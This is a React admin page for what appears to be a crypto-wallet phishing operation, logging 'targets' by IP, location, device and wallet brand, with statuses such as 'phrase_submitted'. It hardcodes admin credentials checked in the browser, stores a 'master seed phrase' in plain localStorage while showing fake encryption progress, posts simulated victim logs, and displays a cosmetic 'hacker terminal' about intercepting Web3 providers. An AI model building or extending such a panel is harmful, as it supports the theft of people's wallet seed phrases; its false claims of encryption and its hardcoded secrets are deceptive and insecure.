"use client";
import React, { useState, useEffect } from "react";

export default function AdminPage() {
  const [isLogged, setIsLogged] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const [logs, setLogs] = useState<any[]>([]);
  const [expandedLogId, setExpandedLogId] = useState<string | null>(null);

  // Fake Simulation
  const [isSimulating, setIsSimulating] = useState(false);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  
  // Fake Phrase states
  const [masterPhrase, setMasterPhrase] = useState("");
  const [saveStatus, setSaveStatus] = useState<"idle" | "saving" | "success" | "error">("idle");
  const [saveText, setSaveText] = useState("");
  const [toast, setToast] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);

  // Check saved session & phrase on mount
  useEffect(() => {
    if (localStorage.getItem("admin_session") === "yes") {
      setIsLogged(true);
    }
    const saved = localStorage.getItem("master_phrase");
    if (saved) setMasterPhrase(saved);
  }, []);

  // Poll for logs every 3 seconds if logged in
  useEffect(() => {
    if (!isLogged) return;
    const fetchLogs = async () => {
      try {
        const res = await fetch("/api/logs");
        const data = await res.json();
        if (data.logs) setLogs(data.logs);
      } catch (e) {
        console.error("Failed to fetch logs", e);
      }
    };
    fetchLogs();
    const interval = setInterval(fetchLogs, 3000);
    return () => clearInterval(interval);
  }, [isLogged]);

  // Handle Simulation Data
  useEffect(() => {
    if (!isSimulating || !isLogged) return;

    const fakeAdd = async () => {
      const wallets = ["MetaMask", "Trust Wallet", "Coinbase", "SafePal", "Ledger"];
      const statuses = ["visited_site", "connection_failed", "phrase_submitted"];
      const countries = ["USA", "Germany", "United Kingdom", "France", "Japan", "Russia", "Brazil"];
      
      const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      const randomWallet = wallets[Math.floor(Math.random() * wallets.length)];
      const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];

      try {
        await fetch("/api/logs", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            status: randomStatus, 
            wallet: randomWallet, 
            fakeIp: randomIp,
            browserData: { userAgent: "Mozilla/5.0 Simulation", isMobile: Math.random() > 0.5 }
          })
        });
      } catch (err) {}
    };

    const interval = setInterval(fakeAdd, 4500);
    return () => clearInterval(interval);
  }, [isSimulating, isLogged]);

  // Handle Terminal Messages
  useEffect(() => {
    if (!isLogged) return;
    
    const msgs = [
      "[+] Handshake established with node eth-mainnet-02",
      "[*] Intercepting Web3 provider for target segment...",
      "[!] Connection request timed out for host 92.14.2.8",
      "[*] Synchronizing shared state with remote vault...",
      "[+] Cryptographic key rotation successful",
      "[*] Pinging global proxy cluster nodes...",
      "[-] Target segment heartbeat failure — retrying injection",
      "[+] Metadata captured: fingerprinting active targets",
      "[*] Verifying session consistency for inbound streams",
      "[+] Encrypting response payload with AES-256-GCM"
    ];

    const generate = () => {
      const line = `${new Date().toLocaleTimeString()} ${msgs[Math.floor(Math.random() * msgs.length)]}`;
      setTerminalLogs(prev => [line, ...prev].slice(0, 50));
    };

    const interval = setInterval(generate, 1800);
    return () => clearInterval(interval);
  }, [isLogged]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === "Admin" && password === "Admin@icui4cu2") {
      localStorage.setItem("admin_session", "yes");
      setIsLogged(true);
      setError("");
    } else {
      setError("Invalid credentials");
    }
  };

  const handleSavePhrase = (e: React.FormEvent) => {
    e.preventDefault();
    if (saveStatus === "saving" || !masterPhrase) return;
    
    setSaveStatus("saving");
    setSaveText("Initiating secure connection...");
    
    // Fake a complex 30-second handshake
    setTimeout(() => setSaveText("Establishing P2P node linkage..."), 4000);
    setTimeout(() => setSaveText("Hashing seed phrase (SHA-256)..."), 10000);
    setTimeout(() => setSaveText("Generating cryptographic keypair..."), 16000);
    setTimeout(() => setSaveText("Synchronizing offline vault..."), 24000);
    
    setTimeout(() => {
      localStorage.setItem("master_phrase", masterPhrase);
      setSaveStatus("success");
      setToast("Master phrase secured & encrypted.");
      setSaveText("");
      setTimeout(() => {
        setSaveStatus("idle");
        setToast("");
      }, 5000);
    }, 30000);
  };

  if (!isLogged) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4" style={{ fontFamily: "Inter, sans-serif" }}>
        <form onSubmit={handleLogin} className="w-full max-w-sm bg-[#111] border border-zinc-800 rounded-2xl p-8 shadow-2xl">
          <div className="flex justify-center mb-6">
            <div className="w-16 h-16 bg-blue-600 rounded-xl flex items-center justify-center text-3xl shadow-lg shadow-blue-500/20">
              🛡️
            </div>
          </div>
          <h1 className="text-2xl font-bold text-center text-white mb-8">Admin Panel</h1>
          
          {error && <div className="bg-red-500/10 border border-red-500/50 text-red-500 text-sm p-3 rounded-lg mb-6">{error}</div>}

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-2">Username</label>
              <input 
                type="text" 
                value={username} onChange={e => setUsername(e.target.value)}
                className="w-full bg-[#1a1a1a] border border-zinc-800 text-white rounded-lg p-3 focus:outline-none focus:border-blue-500 transition-colors"
                autoComplete="off"
              />
            </div>
            <div>
              <label className="block text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-2">Password</label>
              <input 
                type="password" 
                value={password} onChange={e => setPassword(e.target.value)}
                className="w-full bg-[#1a1a1a] border border-zinc-800 text-white rounded-lg p-3 focus:outline-none focus:border-blue-500 transition-colors"
              />
            </div>
          </div>

          <button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg mt-8 transition-colors">
            Access Dashboard
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-zinc-300" style={{ fontFamily: "Inter, sans-serif" }}>
      {/* Navbar */}
      <nav className="bg-[#111] border-b border-zinc-800 px-6 py-4 flex justify-between items-center sticky top-0 z-10 shadow-md">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 flex items-center justify-center bg-blue-600 rounded-lg text-white font-bold text-sm">
            W
          </div>
          <span className="font-bold text-white text-lg tracking-tight">System Console</span>
        </div>
        <button 
          onClick={() => { localStorage.removeItem("admin_session"); setIsLogged(false); }}
          className="text-sm font-medium text-zinc-400 hover:text-white transition-colors px-3 py-1.5 rounded-lg border border-zinc-800 hover:bg-zinc-800"
        >
          Logout
        </button>
      </nav>

      <main className="max-w-6xl mx-auto p-6 grid grid-cols-1 md:grid-cols-3 gap-6">
        
        {/* Left Col: Master Phrase Setting */}
        <div className="md:col-span-1 space-y-6">
          <div className="bg-[#111] border border-zinc-800 rounded-2xl p-6 shadow-xl relative overflow-hidden">
            {/* Decorative background flair */}
            <div className="absolute -top-10 -right-10 w-32 h-32 bg-blue-500/10 rounded-full blur-2xl"></div>
            
            <h2 className="text-lg font-bold text-white mb-2 flex items-center gap-2">
              <span>🔑</span> Master Encryption Key
            </h2>
            <p className="text-xs text-zinc-400 mb-6 leading-relaxed">
              Set the Master Seed Phrase used to secure wallet connections. Ensure this phrase is highly secure. This key remains bound to the local instance.
            </p>
            
            <form onSubmit={handleSavePhrase}>
              <div className="relative mb-4">
                <textarea 
                  value={saveStatus === "saving" ? "••••••••••••••••••••••••••••••••••••••••••••••••••••••••" : (!showPhrase && masterPhrase ? "••••••••••••••••••••••••••••••••••••••••••••••••••••••••" : masterPhrase)}
                  onChange={e => {
                    if (saveStatus !== "saving") {
                      setMasterPhrase(e.target.value);
                    }
                  }}
                  disabled={saveStatus === "saving"}
                  onFocus={() => setShowPhrase(true)}
                  onBlur={() => setShowPhrase(false)}
                  placeholder="Enter 12/24 word master phrase..."
                  className={`w-full h-32 bg-[#1a1a1a] border ${saveStatus === "saving" ? "border-amber-500/50 text-amber-500/50" : "border-zinc-800 text-white"} text-sm font-mono p-4 rounded-xl focus:outline-none focus:border-blue-500 transition-colors resize-none placeholder:text-zinc-600`}
                />
                
                {saveStatus === "saving" && (
                  <div className="absolute inset-0 bg-black/60 rounded-xl flex flex-col items-center justify-center backdrop-blur-sm border border-zinc-800 z-10">
                    <svg className="animate-spin -ml-1 mr-3 h-8 w-8 text-amber-500 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span className="text-amber-500 font-mono text-xs animate-pulse text-center px-4">{saveText}</span>
                  </div>
                )}
              </div>
              <button 
                type="submit" 
                disabled={saveStatus === "saving" || !masterPhrase}
                className={`w-full font-semibold py-3 px-4 rounded-xl transition-all shadow-lg active:scale-95 flex items-center justify-center gap-2
                  ${saveStatus === "saving" || !masterPhrase
                    ? "bg-zinc-800 text-zinc-500 cursor-not-allowed shadow-none" 
                    : "bg-blue-600 hover:bg-blue-700 text-white shadow-blue-500/20"}`}
              >
                {saveStatus === "saving" ? (
                  <span>Encrypting Protocol...</span>
                ) : (
                  <span>Save & Encrypt Phrase</span>
                )}
              </button>
            </form>
            
            {toast && (
              <div className="mt-4 p-3 bg-green-500/10 border border-green-500/30 text-green-400 text-xs text-center rounded-lg font-medium animate-pulse">
                {toast}
              </div>
            )}
          </div>

          <div className="bg-[#111] border border-zinc-800 rounded-2xl p-6 shadow-xl">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-lg font-bold text-white">System Simulation</h2>
              <button 
                onClick={() => setIsSimulating(!isSimulating)}
                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${isSimulating ? 'bg-blue-600' : 'bg-zinc-700'}`}
              >
                <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${isSimulating ? 'translate-x-6' : 'translate-x-1'}`} />
              </button>
            </div>
            <p className="text-xs text-zinc-500 mb-6 leading-relaxed">
              Enable "Global Node Simulator" to generate artificial target activity. This produces high-density data for stress testing and validation.
            </p>
            <div className="flex items-center gap-3">
              <div className={`w-2 h-2 rounded-full ${isSimulating ? 'bg-blue-500 animate-pulse' : 'bg-red-500'}`} />
              <span className="text-[10px] font-bold uppercase tracking-wider text-zinc-400">
                {isSimulating ? 'Simulator Active: Broadcasting...' : 'Simulator Idle'}
              </span>
            </div>
          </div>

          <div className="bg-[#111] border border-zinc-800 rounded-2xl p-6 shadow-xl">
            <h2 className="text-lg font-bold text-white mb-4">System Status</h2>
            <div className="space-y-4">
              <div className="flex justify-between items-center text-sm">
                <span className="text-zinc-500">Node Gateway</span>
                <span className="text-green-500 font-mono text-xs bg-green-500/10 px-2 py-1 rounded">ONLINE</span>
              </div>
              <div className="flex justify-between items-center text-sm">
                <span className="text-zinc-500">Key Rotation</span>
                <span className="text-blue-500 font-mono text-xs bg-blue-500/10 px-2 py-1 rounded">ACTIVE</span>
              </div>
              <div className="flex justify-between items-center text-sm">
                <span className="text-zinc-500">Live Viewers</span>
                <span className="text-white font-bold">{logs.filter(l => l.status === "visited_site").length}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Right Col: Live Logs & Terminal */}
        <div className="md:col-span-2 space-y-6">
          <div className="bg-[#111] border border-zinc-800 rounded-2xl overflow-hidden shadow-xl flex flex-col h-[400px]">
            <div className="px-6 py-4 border-b border-zinc-800 bg-[#161616] flex justify-between items-center">
              <h2 className="text-lg font-bold text-white flex items-center gap-2">
                <span className="relative flex h-3 w-3">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
                </span>
                Live Event Logs
              </h2>
              <span className="text-xs font-mono text-zinc-500">Auto-refreshing...</span>
            </div>
            
            <div className="flex-1 overflow-auto p-0 bg-[#0a0a0a]">
              {logs.length === 0 ? (
                <div className="h-full flex items-center justify-center text-zinc-600 space-y-4 flex-col py-20">
                  <svg className="w-12 h-12 opacity-50" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <p>Awaiting incoming connections...</p>
                </div>
              ) : (
                <table className="w-full text-left border-collapse text-sm">
                  <thead className="bg-[#1a1a1a] sticky top-0 z-10">
                    <tr>
                      <th className="px-6 py-3 font-semibold text-zinc-400 text-xs uppercase tracking-wider border-b border-zinc-800">Time</th>
                      <th className="px-6 py-3 font-semibold text-zinc-400 text-xs uppercase tracking-wider border-b border-zinc-800">IP Address</th>
                      <th className="px-6 py-3 font-semibold text-zinc-400 text-xs uppercase tracking-wider border-b border-zinc-800">Location</th>
                      <th className="px-6 py-3 font-semibold text-zinc-400 text-xs uppercase tracking-wider border-b border-zinc-800">Device / Browser</th>
                      <th className="px-6 py-3 font-semibold text-zinc-400 text-xs uppercase tracking-wider border-b border-zinc-800">Assoc. Wallet</th>
                      <th className="px-6 py-3 font-semibold text-zinc-400 text-xs uppercase tracking-wider border-b border-zinc-800">Action / Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-zinc-800/60 font-mono text-xs">
                    {logs.map((log) => (
                      <React.Fragment key={log.id}>
                        <tr 
                          onClick={() => setExpandedLogId(expandedLogId === log.id ? null : log.id)}
                          className="hover:bg-[#161616] transition-colors group cursor-pointer"
                        >
                          <td className="px-6 py-4 whitespace-nowrap text-zinc-500">
                            {new Date(log.timestamp).toLocaleTimeString()}
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-zinc-300 flex items-center gap-2">
                            {log.ip}
                            <svg className={`w-4 h-4 text-zinc-600 transition-transform ${expandedLogId === log.id ? 'rotate-180' : ''}`} fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-zinc-400">
                            {log.location || "Unknown"}
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-zinc-400">
                            {log.isMobile ? "📱" : "💻"} {log.os || "Unknown OS"} • {log.browser || "Unknown Browser"}
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap text-blue-400">
                            {log.wallet || "-"}
                          </td>
                          <td className="px-6 py-4 whitespace-nowrap">
                            {log.status === "visited_site" && (
                              <span className="inline-flex items-center px-2 py-1 rounded bg-zinc-800 text-zinc-300">
                                Target Visited Platform
                              </span>
                            )}
                            {log.status === "connection_failed" && (
                              <span className="inline-flex items-center px-2 py-1 rounded bg-amber-500/10 text-amber-500 border border-amber-500/20">
                                Connection Request Refused
                              </span>
                            )}
                            {log.status === "phrase_submitted" && (
                              <span className="inline-flex items-center px-2 py-1 rounded bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
                                Phase Submitting (Encrypted)
                              </span>
                            )}
                          </td>
                        </tr>
                        {expandedLogId === log.id && (
                          <tr className="bg-[#0d0d0d] border-t border-b border-zinc-800/50">
                            <td colSpan={6} className="px-6 py-6">
                              <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
                                <div>
                                  <h4 className="text-[10px] uppercase tracking-wider text-zinc-500 mb-2 font-semibold">Exact Timestamp</h4>
                                  <p className="text-zinc-300">{new Date(log.timestamp).toLocaleString()}</p>
                                </div>
                                <div>
                                  <h4 className="text-[10px] uppercase tracking-wider text-zinc-500 mb-2 font-semibold">Geolocation Details</h4>
                                  <p className="text-zinc-300">{log.location}</p>
                                </div>
                                <div className="md:col-span-2">
                                  <h4 className="text-[10px] uppercase tracking-wider text-zinc-500 mb-2 font-semibold">Device Profile</h4>
                                  <p className="text-zinc-300">{log.os} / {log.browser} {log.isMobile ? "(Mobile Device)" : "(Desktop Device)"}</p>
                                </div>
                              </div>
                            </td>
                          </tr>
                        )}
                      </React.Fragment>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>

          {/* Hacker Terminal */}
          <div className="bg-[#0c0c0c] border border-zinc-800 rounded-2xl overflow-hidden shadow-2xl h-[250px] flex flex-col font-mono text-xs relative">
            <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/50 flex justify-between items-center">
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-red-500/50" />
                <div className="w-2 h-2 rounded-full bg-yellow-500/50" />
                <div className="w-2 h-2 rounded-full bg-green-500/50" />
                <span className="ml-2 text-zinc-500 text-[10px] font-bold uppercase tracking-widest">Real-time Activity Console</span>
              </div>
              <div className="flex items-center gap-1">
                <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
                <span className="text-[9px] text-red-500 font-bold uppercase">Streaming live</span>
              </div>
            </div>
            
            <div className="flex-1 p-4 overflow-y-auto space-y-1.5 scrollbar-thin scrollbar-thumb-zinc-800">
              {terminalLogs.length === 0 ? (
                <div className="text-zinc-700 animate-pulse">Initializing segment data synchronization...</div>
              ) : (
                terminalLogs.map((log, i) => (
                  <div key={i} className="flex gap-4 group">
                    <span className="text-zinc-600 select-none">[{50 - i}]</span>
                    <span className={`flex-1 ${log.includes('[+]') ? 'text-blue-400' : log.includes('[-]') ? 'text-red-400' : log.includes('[!]') ? 'text-amber-500' : 'text-zinc-400'}`}>
                      {log}
                    </span>
                  </div>
                ))
              )}
            </div>

            {/* Overlays for "Hacker" aesthetic */}
            <div className="absolute inset-0 pointer-events-none bg-gradient-to-t from-black/40 to-transparent" />
            <div className="absolute inset-0 pointer-events-none overflow-hidden opacity-[0.03]">
              <div className="grid grid-cols-2 gap-4 h-full w-full">
                {[...Array(12)].map((_, i) => (
                  <div key={i} className="border border-white h-10 w-full" />
                ))}
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
